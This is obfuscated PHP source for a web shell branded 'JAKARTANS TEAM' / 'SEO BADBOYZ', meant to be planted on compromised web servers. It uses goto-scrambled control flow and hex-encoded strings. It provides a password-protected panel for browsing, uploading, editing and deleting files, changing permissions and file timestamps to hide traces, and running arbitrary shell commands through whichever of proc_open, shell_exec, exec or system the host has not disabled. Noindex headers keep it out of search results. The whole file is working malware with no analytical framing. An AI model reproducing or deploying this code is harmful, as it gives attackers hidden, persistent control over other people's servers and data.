          <?php  goto hj59O; OSyna: function isTextFile($p) { if (is_dir($p) || !is_file($p)) { return false; } $ext = strtolower(pathinfo($p, PATHINFO_EXTENSION)); $text = array("\164\x78\164", "\x6d\x64", "\152\x73\157\156", "\x6a\x73", "\164\163", "\143\163\x73", "\163\x63\163\x73", "\x6c\x65\x73\x73", "\150\164\155\x6c", "\x68\x74\x6d", "\170\155\154", "\x73\x76\x67", "\x70\x68\x70", "\160\150\x74\155\x6c", "\x69\156\x63", "\x69\x6e\x69", "\143\146\147", "\145\x6e\166", "\171\x6d\x6c", "\x79\x61\155\x6c", "\160\x79", "\x72\x62", "\x67\x6f", "\162\x73", "\143", "\150", "\x63\160\x70", "\x68\x70\x70", "\x6a\141\x76\x61", "\153\x74", "\163\x71\154", "\x63\x73\166", "\x6c\x6f\147"); if (in_array($ext, $text, true)) { return true; } $s = @file_get_contents($p, false, null, 0, 2048); if ($s === false) { return false; } return (bool) preg_match("\57\x2f\165", $s); } goto NyE8m; QbN1G: if (empty($_SESSION["\141\165\x74\150"])) { render_login(); die; } goto kEA_i; vYo19: if ($action === "\154\157\x67\151\x6e" && $_SERVER["\x52\105\121\x55\105\x53\124\137\x4d\x45\124\110\117\x44"] === "\x50\117\x53\124") { ensureCsrf(); $u = isset($_POST["\x75\x73\145\x72"]) ? $_POST["\x75\x73\x65\x72"] : ''; $p = isset($_POST["\x70\x61\x73\x73"]) ? $_POST["\x70\141\163\x73"] : ''; if (verify_login_creds($u, $p)) { $_SESSION["\141\x75\x74\150"] = true; $_SESSION["\x77\150\x6f"] = $u; header("\114\x6f\x63\x61\x74\x69\157\156\72\40\x3f\x70\75" . rawurlencode($current)); die; } else { render_login("\x49\156\143\157\x72\x72\x65\143\x74\x20\x75\x73\145\162\156\x61\155\x65\x20\157\162\40\x70\141\x73\x73\x77\157\162\x64"); die; } } goto QbN1G; qbmBS: echo svgIcon("\x70\167\170", "\151\x63\x6f"); goto YthIg; mjCfU: ?>

      <?php  goto TAIe7; FFORG: ?>
">
            <input type="file" name="files[]" multiple class="block text-sm file:mr-3 file:rounded-md file:border file:border-slate-700 file:px-3 file:py-1.5 file:bg-slate-800 file:text-slate-200">
            <button class="btn w-full" type="submit">Upload Files</button>
            <div class="text-xs text-slate-400">Fallback order: move × rename × copy × get+put × stream copy.</div>
          </form>
          <form method="post" action="?a=url-upload&p=<?php  goto QC4cr; wFs6L: if (!function_exists("\151\x73\x5f\x66\x6e\x5f\x75\x73\141\142\x6c\x65")) { function is_fn_usable($fn) { if (!function_exists($fn)) { return false; } $disabled = (string) @ini_get("\x64\x69\x73\141\142\154\145\137\x66\x75\156\143\x74\x69\x6f\x6e\x73"); $suhosin = (string) @ini_get("\163\x75\150\157\x73\x69\x6e\56\145\x78\x65\143\165\164\x6f\x72\x2e\x66\x75\156\x63\x2e\x62\154\141\x63\153\154\151\163\164"); $blocked = array(); if ($disabled !== '') { $blocked = array_merge($blocked, array_map("\164\162\151\155", explode("\x2c", $disabled))); } if ($suhosin !== '') { $blocked = array_merge($blocked, array_map("\164\162\x69\155", explode("\54", $suhosin))); } if (!empty($blocked)) { $blocked = array_filter(array_map("\163\x74\x72\164\x6f\154\157\167\x65\x72", $blocked)); if (in_array(strtolower($fn), $blocked, true)) { return false; } } return true; } } goto o3Nj0; UWsJj: function breadcrumbs($path) { $out = array(); if (preg_match("\176\136\x5b\101\x2d\132\141\x2d\x7a\135\72\x5c\x5c\x7e", $path)) { $drive = substr($path, 0, 2); $rest = substr($path, 2); $segments = array_values(array_filter(explode("\134\134", $rest), "\x73\164\162\x6c\145\156")); $acc = $drive . "\134"; $out[] = array($drive . "\x5c", $acc); foreach ($segments as $s) { $acc .= $s . "\134"; $out[] = array($s, rtrim($acc, "\134")); } } else { $segments = array_values(array_filter(explode("\x2f", $path), "\163\x74\x72\x6c\x65\x6e")); $acc = "\x2f"; $out[] = array("\x2f", "\x2f"); foreach ($segments as $s) { $acc .= $s . "\x2f"; $out[] = array($s, rtrim($acc, "\x2f")); } } return $out; } goto sTY8g; CLH1h: foreach ($items as $it) { $full = $current . DIRECTORY_SEPARATOR . $it; if (is_dir($full)) { $dirs[] = $it; } else { $files[] = $it; } } goto VOJEk; N22KI: ?>
        </div>
        <hr class="my-4 border-slate-700">
        <form method="get" class="space-y-2">
          <label class="text-sm text-slate-300">Change Path</label>
          <input type="text" name="p" class="field mono" placeholder="/home/user" value="<?php  goto FSgnU; j0Br0: $current = rtrim($current, DIRECTORY_SEPARATOR); goto IfiMT; PZjs3: if (!function_exists("\146\x78\x5f\x67\172\151\156\x66\x6c\x61\x74\145")) { function fx_gzinflate($data, $length = 0) { if (is_fn_usable("\147\172\151\156\x66\154\141\164\145")) { return @gzinflate($data, $length); } if (is_fn_usable("\147\172\144\145\143\157\x64\145")) { return @gzdecode($data); } if (is_fn_usable("\147\172\x75\156\x63\157\x6d\x70\x72\x65\x73\163")) { return @gzuncompress($data); } return false; } } goto DAxMZ; MNbK2: function render_login($err = '') { $csrf = isset($_SESSION["\143\x73\162\x66"]) ? $_SESSION["\x63\x73\162\x66"] : ''; ?>
   <!doctype html>
<html lang="en" class="dark">
<head>
  <meta charset="utf-8">
  <title>WE ARE JAKARTANS</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="robots" content="noindex,nofollow,noarchive,nosnippet,noimageindex">
  <meta name="googlebot" content="noindex,nofollow,noarchive,nosnippet,noimageindex">

  <script src="https://cdn.tailwindcss.com"></script>
  <script>
    tailwind.config={
      theme:{
        extend:{
          fontFamily:{
            ui:['Ubuntu','ui-sans-serif','system-ui','Segoe UI','Roboto','Helvetica Neue','Arial','Noto Sans']
          },
          colors:{
            canvas:{DEFAULT:'#0b1220',surface:'rgba(15,23,42,.8)'}
          },
          boxShadow:{
            soft:'0 10px 30px rgba(0,0,0,.45)',
            card:'0 6px 20px rgba(37,99,235,.22)'
          },
          borderRadius:{xl2:'18px'}
        }
      },
      darkMode:'class'
    }
  </script>

  <link href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@300;400;500;700&display=swap" rel="stylesheet">
  <link href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjJaoTeuaG3Vp6wNVHiI3_7RW_OpulryFwB_o5O5I3z61aZrABGjjgnT1I2iAlZzG5QdFjVz5eEo7BtzvCdSAHezzSR_A2i_LFcFxDoMrc8OTxNgs9mHX2hMERGufR_4qAZj5r29uvy5Wv3OZZDDOdCUtOzeJf9IFlzJgntWsMWnQxtpb_t7pd-T3Q1Ock/s1024/jakartans-logo.png" rel="icon">

  <style>
    :root{color-scheme:dark}
    html,body{height:100%}

    body{
      font-family:'Ubuntu',system-ui,-apple-system,Segoe UI,Roboto,"Helvetica Neue",Arial,"Noto Sans";
    }

    /* ✅ BACKGROUND IMAGE DITAMBAHKAN DI SINI */
    .shell{
      min-height:100vh;
      background:
        linear-gradient(rgba(11,18,32,.35), rgba(11,18,32,.35)),
        url("https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhS4-Ur1M0AF5_oQTYXjcC5MepAlGt3HKLc0QLHspmYQ7iTfln0SUtkSQak6AZ1-h_0yq6eOmbyfRRZJ1UMhUt8s_HQxjHqcULFe1ApCVRIOFWN8re-UBDV6yvGTR6uREN_MGGqBQnx-nKH5Sd1J-zbA_HOHhA1NW_o39Owk8Kbs213XOnxKdewVrk3R9Q/s736/kok.gif") center/cover no-repeat;
      display:flex;
      align-items:center;
      justify-content:center;
    }

    .card{
      background:rgba(15,23,42,.8);
      border:1px solid rgba(148,163,184,.15);
      border-radius:18px;
      box-shadow:0 10px 30px rgba(0,0,0,.45),
                 inset 0 1px 0 rgba(255,255,255,.03);
      backdrop-filter:blur(8px);
    }

    .btn{
      background:linear-gradient(180deg,#7c00ff,#e400ff);
      color:#eaf2ff;
      border-radius:12px;
      padding:.7rem 1rem;
      font-weight:700;
      transition:transform .05s, box-shadow .15s, filter .15s;
      box-shadow:0 6px 20px rgba(37,99,235,.25);
    }

    .btn:hover{
      filter:brightness(1.05);
      box-shadow:0 10px 26px rgba(37,99,235,.35)
    }

    .btn:active{transform:translateY(.5px)}

    .field{
      border:1px solid rgba(148,163,184,.18);
      border-radius:12px;
      padding:.6rem .8rem;
      width:100%;
      background:#0b1220;
      color:#e5e7eb;
    }

    .field:focus{
      outline:none;
      box-shadow:0 0 0 4px rgba(59,130,246,.25);
      border-color:#3b82f6
    }

    .title{
      background:linear-gradient(90deg,#93c5fd,#c4b5fd);
      -webkit-background-clip:text;
      background-clip:text;
      color:transparent
    }
  </style>
</head>

<body class="shell text-slate-100">
  <div class="w-full max-w-md card p-6">
    <div class="mb-5 flex items-center justify-between">
<img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjJaoTeuaG3Vp6wNVHiI3_7RW_OpulryFwB_o5O5I3z61aZrABGjjgnT1I2iAlZzG5QdFjVz5eEo7BtzvCdSAHezzSR_A2i_LFcFxDoMrc8OTxNgs9mHX2hMERGufR_4qAZj5r29uvy5Wv3OZZDDOdCUtOzeJf9IFlzJgntWsMWnQxtpb_t7pd-T3Q1Ock/s1024/jakartans-logo.png" 
     alt="THE JAKARTANS" 
     style="max-width:50%; height:auto;">
      <span class="text-xs text-slate-400">PHP <?php  echo h(PHP_VERSION); ?>
</span>
    </div>

    <?php  if ($err) { ?>
      <div class="mb-3 rounded-lg border border-red-900/60 bg-red-900/30 text-red-100 px-3 py-2">
        <?php  echo h($err); ?>
      </div>
    <?php  } ?>

    <form method="post" action="?a=login" class="space-y-3">
      <input type="hidden" name="csrf" value="<?php  echo h($csrf); ?>
">
      <div>
        <label class="text-sm text-slate-300">Username</label>
        <input class="field mt-1" name="user" type="text" autocomplete="username" required>
      </div>
      <div>
        <label class="text-sm text-slate-300">Password</label>
        <input class="field mt-1" name="pass" type="password" autocomplete="current-password" required>
      </div>
      <button class="btn w-full" type="submit">Login</button>
    </form>

    <p class="text-[12px] text-slate-400 mt-4 text-center">© SEO BADBOYZ - THE JAKARTANS</p>
      </div>
    </body></html><?php  } goto iiWbF; YthIg: ?>
</div>
        <div>
          <div class="text-lg font-semibold tracking-tight" style="background:linear-gradient(90deg,#93c5fd,#c4b5fd);-webkit-background-clip:text;background-clip:text;color:transparent"><a href="?">JAKARTANS TEAM</a></div>
          <div class="text-xs text-slate-400">PHP <?php  goto Zlxuw; Nhs_i: ?>
">
          <textarea id="cmdTA" name="cmd" class="field mono w-full" placeholder="Run Command" rows="1"></textarea>
          <button class="btn btn-sm shrink-0" type="submit">Run</button>
        </form>
      </div>

      <form method="post" action="?a=logout&p=<?php  goto d3rYI; Slmh2: ?>
">
          <label class="text-sm text-slate-300">New Folder</label>
          <input type="text" name="name" class="field mono" placeholder="NewFolder" required>
          <button class="btn w-full" type="submit">Create Folder</button>
        </form>
      </section>

      <section class="card p-4">
        <h2 class="font-medium mb-3">Upload</h2>
        <div class="grid grid-cols-1 gap-4">
          <form method="post" enctype="multipart/form-data" action="?a=upload&p=<?php  goto U1vpf; Ct3Nl: function tryWriteFromTmp($tmp, $dest) { $err = array(); if (@move_uploaded_file($tmp, $dest)) { return array(true, null); } $err[] = "\x6d\x6f\x76\145\137\165\160\x6c\x6f\x61\x64\x65\x64\137\146\151\154\x65"; if (@rename($tmp, $dest)) { return array(true, null); } $err[] = "\x72\x65\x6e\x61\x6d\x65"; if (@copy($tmp, $dest)) { return array(true, null); } $err[] = "\x63\157\x70\171"; $d = @file_get_contents($tmp); if ($d !== false && @file_put_contents($dest, $d) !== false) { return array(true, null); } $err[] = "\x67\x65\x74\53\x70\165\x74"; $in = @fopen($tmp, "\162\142"); $out = @fopen($dest, "\167\142"); if ($in && $out) { $c = stream_copy_to_stream($in, $out); @fclose($in); @fclose($out); if ($c !== false) { return array(true, null); } $err[] = "\163\164\x72\145\141\x6d\x5f\x63\x6f\160\171"; } else { $err[] = "\x66\x6f\160\145\x6e"; } return array(false, implode("\x3b\x20", $err) . "\40\x66\x61\151\x6c\x65\x64"); } goto OIopH; IFnTq: echo je($viewFile ? basename($viewFile) : ''); goto WxXmZ; g75Mz: ?>
;
    var currentPath = <?php  goto VoqtF; gLFD0: ?>
" class="hidden md:flex items-center gap-2 w-full" id="cmdForm">
          <input type="hidden" name="csrf" value="<?php  goto fgih6; rBGUr: if (!empty($_SESSION["\x63\x6d\x64\137\x72\145\163\x75\x6c\x74"])) { $cr = $_SESSION["\143\x6d\x64\x5f\x72\x65\163\165\154\164"]; unset($_SESSION["\143\x6d\x64\137\162\x65\163\165\154\x74"]); ?>
      <section class="col-span-12">
        <div class="card p-4 mb-4">
          <details open>
            <summary class="cursor-pointer font-medium">
              Command Output × <span class="mono"><?php  echo h($cr["\143\x6d\144"]); ?>
</span>
              <span class="ml-2 text-xs text-slate-400">via <?php  echo h($cr["\155\x65\164\x68\x6f\144"]); ?>
, exit <?php  echo h((string) $cr["\x63\x6f\144\x65"]); ?>
</span>
            </summary>
            <pre id="cmdOutPre" class="mt-3 p-3 bg-black/40 rounded-lg overflow-auto text-xs mono border border-slate-700" style="max-height: 480px;"><?php  echo h($cr["\157\x75\x74"]); ?>
</pre>
          </details>
        </div>
      </section>
    <?php  } goto t6NsK; f0LIQ: foreach ($files as $name) { $full = $current . DIRECTORY_SEPARATOR . $name; $size = (int) @filesize($full); $mtime = (int) @filemtime($full); $ext = strtolower(pathinfo($full, PATHINFO_EXTENSION)); $r = @is_readable($full); $w = @is_writable($full); $permColorClass = $w ? "\x74\145\x78\x74\55\154\151\x6d\145\x2d\x34\x30\60" : ($r ? "\164\x65\170\x74\x2d\167\150\x69\164\x65" : "\x74\145\x78\164\55\x72\x65\144\55\64\x30\60"); ?>
                  <tr class="border-b border-slate-800 hoverable"
                      data-type="file"
                      data-name="<?php  echo h(strtolower($name)); ?>
"
                      data-size="<?php  echo $size; ?>
"
                      data-mtime="<?php  echo $mtime; ?>
"
                      draggable="true"
                      ondragstart="onDragStartItem(event, <?php  echo je($name); ?>
)">
                    <td class="py-2 px-2"><input class="rowchk" type="checkbox" name="items[]" value="<?php  echo h($name); ?>
"></td>
                    <td class="py-2 px-2">
                      <div class="flex items-center gap-2 <?php  echo $permColorClass; ?>
">
                        <?php  echo iconSvgFor($full); ?>
                        <a class="font-medium hover:underline text-white"
                           draggable="false"
                           onclick="return guardLinkCopy(event)"
                           href="?a=view&f=<?php  echo rawurlencode($name); ?>
&p=<?php  echo rawurlencode($current); ?>
">
                          <?php  echo h($name); ?>
                        </a>
                      </div>
                    </td>
                    <td class="py-2 px-2 mono"><?php  echo h(humanSize($size)); ?>
</td>
                    <td class="py-2 px-2 mono <?php  echo $permColorClass; ?>
"><?php  echo h(permsToString($full)); ?>
</td>
                    <td class="py-2 px-2"><?php  echo h(date("\131\55\x6d\x2d\144\x20\x48\x3a\151\x3a\163", $mtime ?: time())); ?>
</td>
                    <td class="py-2 px-2">
                      <div class="row-actions"><a class="btn btn-xs btnw" href="?a=edit&f=<?php  echo rawurlencode($name); ?>
&p=<?php  echo rawurlencode($current); ?>
">Edit</a>
                        <a class="btn btn-xs btnw" href="?a=download&f=<?php  echo rawurlencode($name); ?>
&p=<?php  echo rawurlencode($current); ?>
">Download</a>

                        <button type="button" class="btn btn-xs btnw" onclick="toggleRow('rn-<?php  echo h($name); ?>
')">Rename</button>
                        <button type="button" class="btn btn-xs btnw" onclick="toggleRow('cm-<?php  echo h($name); ?>
')">Chmod</button>
                        <button type="button" class="btn btn-xs btnw" onclick="toggleRow('mt-<?php  echo h($name); ?>
')">Change Date</button>

                        <?php  if (in_array($ext, array("\172\x69\160")) || preg_match("\x7e\x5c\56\x28\164\141\162\x7c\164\x61\162\134\56\x67\x7a\174\164\x61\x72\x5c\56\x62\172\62\174\x74\x61\x72\x5c\x2e\170\x7a\51\44\176\151", $name)) { ?>
                          <form method="post" action="?a=unzip&p=<?php  echo rawurlencode($current); ?>
" class="inline">
                            <input type="hidden" name="csrf" value="<?php  echo h($csrf); ?>
">
                            <input type="hidden" name="file" value="<?php  echo h($name); ?>
">
                            <button class="btn btn-xs btnw" type="submit">Unzip here</button>
                          </form>
                        <?php  } ?>

                        <form method="post" action="?a=delete&p=<?php  echo rawurlencode($current); ?>
" class="inline" onsubmit="return confirm('Delete this file?')">
                          <input type="hidden" name="csrf" value="<?php  echo h($csrf); ?>
">
                          <input type="hidden" name="target" value="<?php  echo h($name); ?>
">
                          <button class="btn btn-xs btnw" type="submit">Delete</button>
                        </form>
                      </div>

                      <div id="rn-<?php  echo h($name); ?>
" class="hidden mt-2">
                        <form method="post" action="?a=rename&p=<?php  echo rawurlencode($current); ?>
" class="flex flex-wrap gap-2 mt-1">
                          <input type="hidden" name="csrf" value="<?php  echo h($csrf); ?>
">
                          <input type="hidden" name="old" value="<?php  echo h($name); ?>
">
                          <input type="text" name="new" class="field w-48" placeholder="New name">
                          <button class="btn btn-sm btnw" type="submit">OK</button>
                          <button class="btn btn-sm btnw btn-ghost" type="button" onclick="closeAction(this)">Cancel</button>
                        </form>
                      </div>

                      <div id="cm-<?php  echo h($name); ?>
" class="hidden mt-2">
                        <form method="post" action="?a=chmod&p=<?php  echo rawurlencode($current); ?>
" class="flex flex-wrap gap-2 items-center mt-1">
                          <input type="hidden" name="csrf" value="<?php  echo h($csrf); ?>
">
                          <input type="hidden" name="target" value="<?php  echo h($name); ?>
">
                          <input type="text" name="mode" class="field w-24 mono" placeholder="0644">
                          <label class="text-xs flex items-center gap-1"><input type="checkbox" name="recursive"> recursive</label>
                          <button class="btn btn-sm btnw" type="submit">OK</button>
                          <button class="btn btn-sm btnw btn-ghost" type="button" onclick="closeAction(this)">Cancel</button>
                        </form>
                      </div>

                      <div id="mt-<?php  echo h($name); ?>
" class="hidden mt-2">
                        <form method="post" action="?a=mtime&p=<?php  echo rawurlencode($current); ?>
" class="flex flex-wrap gap-2 items-center">
                          <input type="hidden" name="csrf" value="<?php  echo h($csrf); ?>
">
                          <input type="hidden" name="target" value="<?php  echo h($name); ?>
">
                          <input type="text" name="ts" class="field w-56 mono" placeholder="YYYY-MM-DD HH:MM:SS or epoch" required>
                          <label class="text-xs flex items-center gap-1 opacity-50"><input type="checkbox" disabled> recursive</label>
                          <button class="btn btn-sm btnw" type="submit">OK</button>
                          <button class="btn btn-sm btnw btn-ghost" type="button" onclick="closeAction(this)">Cancel</button>
                        </form>
                      </div>

                    </td>
                  </tr>
                <?php  } goto ZaVoa; YJOF1: if (!function_exists("\x72\165\x6e\137\167\x69\164\x68\x5f\x70\162\157\143\x5f\x6f\x70\145\x6e")) { function run_with_proc_open($cmd, $cwd = null, $timeout = 30) { if (!is_fn_usable("\160\x72\157\x63\137\157\x70\x65\x6e")) { return null; } $des = array(0 => array("\x70\151\160\145", "\162"), 1 => array("\160\x69\x70\x65", "\167"), 2 => array("\160\151\160\x65", "\167")); $pipes = array(); $proc = @proc_open($cmd, $des, $pipes, $cwd ?: null, null); if (!is_resource($proc)) { return null; } if (isset($pipes[1]) && is_resource($pipes[1])) { @stream_set_blocking($pipes[1], false); } if (isset($pipes[2]) && is_resource($pipes[2])) { @stream_set_blocking($pipes[2], false); } if (isset($pipes[0]) && is_resource($pipes[0])) { @fclose($pipes[0]); } $buf = ''; $start = time(); while (true) { $status = @proc_get_status($proc); $running = $status && !empty($status["\x72\x75\x6e\x6e\151\156\147"]); $r = array(); if (isset($pipes[1]) && is_resource($pipes[1])) { $r[] = $pipes[1]; } if (isset($pipes[2]) && is_resource($pipes[2])) { $r[] = $pipes[2]; } if ($r) { $w = null; $e = null; @stream_select($r, $w, $e, 1); foreach ($r as $p) { $chunk = @fread($p, 8192); if ($chunk !== false && $chunk !== '') { $buf .= $chunk; } } } else { usleep(100000); } if (!$running) { break; } if ($timeout > 0 && time() - $start >= $timeout) { @proc_terminate($proc, 9); foreach ($pipes as $p) { if (is_resource($p)) { @fclose($p); } } @proc_close($proc); return array("\155\x65\x74\x68\157\x64" => "\160\x72\157\143\x5f\157\x70\145\156", "\143\x6f\144\145" => 124, "\157\x75\164" => $buf . "\xa\x5b\x74\x69\x6d\145\x6f\165\164\40\x61\x66\x74\x65\162\x20{$timeout}\x73\135"); } } foreach ($pipes as $p) { if (is_resource($p)) { @fclose($p); } } $code = @proc_close($proc); if ($code === -1) { $code = null; } return array("\155\x65\x74\150\x6f\144" => "\x70\x72\x6f\x63\x5f\x6f\160\x65\x6e", "\143\157\144\x65" => $code, "\157\165\164" => $buf); } } goto Erb77; TyjIt: function rrmdir($p) { if (!file_exists($p)) { return true; } if (is_file($p) || is_link($p)) { return @unlink($p); } $ok = true; $h = @opendir($p); if ($h === false) { return false; } while (false !== ($v = readdir($h))) { if ($v === "\x2e" || $v === "\56\56") { continue; } $ok = rrmdir($p . DIRECTORY_SEPARATOR . $v) && $ok; } closedir($h); return @rmdir($p) && $ok; } goto Ct3Nl; JW1Vq: ?>
" class="flex-1 flex flex-col" id="bulkDeleteForm">
          <input type="hidden" name="csrf" value="<?php  goto eLL4f; fV3Xc: $yearNow = date("\131"); goto UldBU; SSuec: if (!function_exists("\x68\141\x73\x68\x5f\x65\x71\165\141\x6c\x73")) { function hash_equals($a, $b) { if (!is_string($a) || !is_string($b)) { return false; } $len = strlen($a); if ($len !== strlen($b)) { return false; } $res = 0; for ($i = 0; $i < $len; $i++) { $res |= ord($a[$i]) ^ ord($b[$i]); } return $res === 0; } } goto GVSML; LbbsH: ?>

    // ===== CodeMirror untuk PREVIEW (readonly, auto-detect) =====
    (function(){
      var pre = document.getElementById('previewPre');
      if(!pre || typeof CodeMirror === 'undefined') return;

      CodeMirror.modeURL = "https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/mode/%N/%N.min.js";
      var filename = <?php  goto IFnTq; Keaqh: ?>

                <?php  goto f0LIQ; cVLar: if (!function_exists("\x66\x78\x5f\160\x6f\163\151\170\137\147\x65\x74\x70\167\x75\151\x64")) { function fx_posix_getpwuid($uid) { if (is_fn_usable("\160\x6f\163\151\x78\x5f\147\x65\x74\160\167\x75\151\144")) { return @posix_getpwuid($uid); } return array("\156\141\x6d\x65" => @get_current_user(), "\165\151\144" => $uid); } } goto SadVZ; QgjJ8: function addDirToPhar($phar, $dir, $local) { $dir = rtrim($dir, DIRECTORY_SEPARATOR); $h = @opendir($dir); if (!$h) { return; } while (false !== ($e = readdir($h))) { if ($e === "\56" || $e === "\56\x2e") { continue; } $full = $dir . DIRECTORY_SEPARATOR . $e; $localPath = $local . "\57" . basename($e); if (is_dir($full)) { if (method_exists($phar, "\141\144\x64\105\155\160\164\x79\x44\x69\x72")) { $phar->addEmptyDir($localPath); } addDirToPhar($phar, $full, $localPath); } elseif (is_file($full) && method_exists($phar, "\x61\144\144\106\x69\154\x65")) { $phar->addFile($full, $localPath); } } closedir($h); } goto cj4qH; CG_XK: if ($editFile && $viewMode === "\x74\x78\x74") { ?>
    (function(){
      var ta = document.getElementById('editor'); if (!ta) return;
      var filename = <?php  echo je(basename($editFile)); ?>
;
      CodeMirror.modeURL = "https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/mode/%N/%N.min.js";
      var info = CodeMirror.findModeByFileName(filename) || CodeMirror.findModeByMIME('text/plain');
      var cm = CodeMirror.fromTextArea(ta, {
        lineNumbers:true, styleActiveLine:true, matchBrackets:true, autoCloseBrackets:true,
        lineWrapping:true, theme:'material-darker',
        mode: (info && info.mime) ? info.mime : 'text/plain',
        viewportMargin: Infinity
      });
      if (info && info.mode) { CodeMirror.autoLoadMode(cm, info.mode); }
      var det = document.getElementById('editPanel'); if(det){ det.addEventListener('toggle', function(){ setTimeout(function(){cm.refresh();},50); }); }
      var form = document.getElementById('editForm'); if(form){ form.addEventListener('submit', function(){ cm.save(); }); }
    })();
    <?php  } goto LbbsH; fBkui: ?>

              </tbody>
            </table>
          </div>
          <!-- below the table -->
          <div class="mt-3">
            <form method="post"
                  action="?a=zip&p=<?php  goto zmV92; FRVoG: echo rawurlencode($current); goto JW1Vq; Erb77: if (!function_exists("\x72\x75\156\x5f\x77\151\x74\x68\137\163\x68\x65\154\x6c\x5f\145\x78\x65\x63")) { function run_with_shell_exec($cmd, $cwd = null) { if (!is_fn_usable("\163\x68\x65\154\154\137\x65\170\145\x63")) { return null; } $full = make_cd_prefix($cwd) . $cmd . "\40\x32\76\46\x31"; $out = @shell_exec($full); if ($out === null) { return null; } return array("\x6d\145\x74\x68\157\144" => "\x73\x68\145\x6c\x6c\x5f\145\170\145\143", "\x63\157\144\145" => null, "\157\165\164" => $out); } } goto mKR_v; DAxMZ: if (!function_exists("\x66\x78\137\x65\x78\145\x63")) { function fx_exec($cmd, &$output = null, &$return_var = null) { if (is_fn_usable("\145\170\x65\143")) { return @exec($cmd, $output, $return_var); } $output = array(); $return_var = 127; return null; } } goto cSHkH; MjzCS: function iconSvgFor($p) { if (is_dir($p)) { return svgIcon("\x66\x6f\154\144\145\162"); } $e = strtolower(pathinfo($p, PATHINFO_EXTENSION)); if (in_array($e, array("\x7a\151\x70", "\162\x61\162", "\67\x7a"))) { return svgIcon("\x7a\151\x70"); } if (in_array($e, array("\152\x70\x67", "\152\x70\145\147", "\x70\156\147", "\147\151\146", "\x77\145\142\x70", "\142\x6d\x70", "\163\x76\147"))) { return svgIcon("\151\x6d\147"); } if (in_array($e, array("\160\144\x66"))) { return svgIcon("\160\144\146"); } if (in_array($e, array("\x63\163\166", "\170\154\x73", "\x78\154\163\x78"))) { return svgIcon("\x73\x68\145\x65\x74"); } if (in_array($e, array("\163\x71\x6c"))) { return svgIcon("\x64\142"); } if (in_array($e, array("\160\x68\x70", "\152\x73", "\164\163", "\143\x73\x73", "\x73\143\163\x73", "\x6c\x65\163\163", "\150\164\x6d\x6c", "\150\164\x6d", "\x78\x6d\x6c", "\171\155\x6c", "\x79\x61\x6d\154", "\151\156\x69", "\x63\x66\147"))) { return svgIcon("\x63\157\144\x65"); } if (in_array($e, array("\x74\x78\164", "\155\x64", "\154\157\147", "\x6a\x73\157\x6e"))) { return svgIcon("\x74\145\170\x74"); } return svgIcon("\146\151\154\145"); } goto eFARF; DaV2r: echo $yearNow; goto x8sE_; pM2SE: header("\130\x2d\x52\x6f\x62\x6f\164\163\x2d\x54\x61\x67\72\40\156\157\151\x6e\144\x65\170\x2c\x20\156\x6f\x66\x6f\x6c\154\x6f\167\x2c\40\x6e\157\x61\x72\x63\x68\151\x76\x65\54\x20\x6e\x6f\x73\156\151\160\x70\x65\164\x2c\40\156\x6f\151\x6d\x61\x67\145\x69\x6e\144\145\170", true); goto uaCgc; lSP1y: if (!function_exists("\x77\x72\x61\160\137\143\155\144\x5f\146\157\x72\137\163\x68\145\154\154")) { function wrap_cmd_for_shell($cmd) { if (DIRECTORY_SEPARATOR === "\134") { return "\x63\x6d\144\56\145\170\x65\x20\57\x43\x20" . $cmd; } return "\57\x62\x69\156\57\163\150\40\55\143\x20" . escapeshellarg($cmd); } } goto YJOF1; DNar4: if (!function_exists("\x66\170\137\x73\x79\163\164\145\155")) { function fx_system($cmd, &$return_var = null) { if (is_fn_usable("\163\171\163\x74\x65\x6d")) { return @system($cmd, $return_var); } $return_var = 127; return null; } } goto G2iBC; UldBU: ?>
<!doctype html>
<html lang="en" class="dark">
<head>
  <meta charset="utf-8">
  <title>JAKARTANS TEAM</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="robots" content="noindex,nofollow,noarchive,nosnippet,noimageindex">
  <meta name="googlebot" content="noindex,nofollow,noarchive,nosnippet,noimageindex">
  <script src="https://cdn.tailwindcss.com"></script>
  <script>
    tailwind.config = { darkMode:'class', theme:{ extend:{
      fontFamily:{ ui:['Ubuntu','ui-sans-serif','system-ui','Segoe UI','Roboto','Helvetica Neue','Arial','Noto Sans'] },
      colors:{ canvas:{DEFAULT:'#0b1220',light:'#0b1220',surface:'rgba(15,23,42,.8)'}, brand:{50:'#eef2ff',500:'#7c00ff',600:'#5458ee',700:'#4338ca'} },
      boxShadow:{ card:'0 10px 30px rgba(0,0,0,.35), inset 0 1px 0 rgba(255,255,255,.03)' , glow:'0 6px 20px rgba(99,102,241,.25)' },
      borderRadius:{ xl2:'18px' }
    } } }
  </script>
  <link href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@300;400;500;700&display=swap" rel="stylesheet">
  <link href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjJaoTeuaG3Vp6wNVHiI3_7RW_OpulryFwB_o5O5I3z61aZrABGjjgnT1I2iAlZzG5QdFjVz5eEo7BtzvCdSAHezzSR_A2i_LFcFxDoMrc8OTxNgs9mHX2hMERGufR_4qAZj5r29uvy5Wv3OZZDDOdCUtOzeJf9IFlzJgntWsMWnQxtpb_t7pd-T3Q1Ock/s1024/jakartans-logo.png" rel="icon">

  <!-- CodeMirror 5 -->
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/codemirror.min.css">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/theme/material-darker.min.css">
  <style>
    .CodeMirror{ border:1px solid rgba(148,163,184,.18); border-radius:12px; height:420px; background:#0b1220; color:#e5e7eb; }
    .cm-s-material-darker .CodeMirror-gutters{ background:#0b1220; border-right:1px solid rgba(148,163,184,.18); }

    html,body{height:100%}
    body{font-family:'Ubuntu',system-ui,-apple-system,Segoe UI,Roboto,"Helvetica Neue",Arial,"Noto Sans";}
    .shell{min-height:100vh;background:radial-gradient(1200px 600px at 20% -10%, rgba(99,102,241,.15), transparent 60%), radial-gradient(900px 500px at 90% 0%, rgba(168,85,247,.12), transparent 60%), #0b1220; display:grid; grid-template-rows:auto 1fr auto;}
